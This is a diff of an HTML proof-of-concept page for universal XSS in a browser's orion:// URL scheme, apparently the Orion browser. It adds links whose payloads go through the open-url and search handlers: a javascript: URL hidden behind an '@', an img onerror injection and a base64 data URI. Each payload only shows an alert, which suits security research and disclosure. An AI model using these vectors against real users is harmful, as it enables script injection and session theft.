@@ -39,10 +39,11 @@
     <p>Click the button or link below to be redirected:</p>
     
     <!-- Hyperlink to another page -->
-    <a href="orion://open-url?url=javascript:alert(window.navigator.userAgent);" target="_blank"> UXSS via Open URL </a>
+    <a href="orion://open-url?url=https://test.com@javascript:alert(window.navigator.userAgent);" target="_blank"> UXSS via Open URL </a>
     <br></br>    
-    <a href="orion://search?q=javascript:alert(window.navigator.userAgent);" target="_blank"> UXSS via Search URL</a>
+    <a href="orion://search?q=<img src=x onerror=alert(1)>" target="_blank"> UXSS via Search URL</a>
     <br></br> 
+    <a href="orion://open-url?url=data:text/html;charset=utf-8;base64,PGltZyBzcmM9eCBvbmVycm9yPWFsZXJ0KCdYU1MnKT4=" target="_blank">DATA URI XSS</a>
     
     <br><br>
 
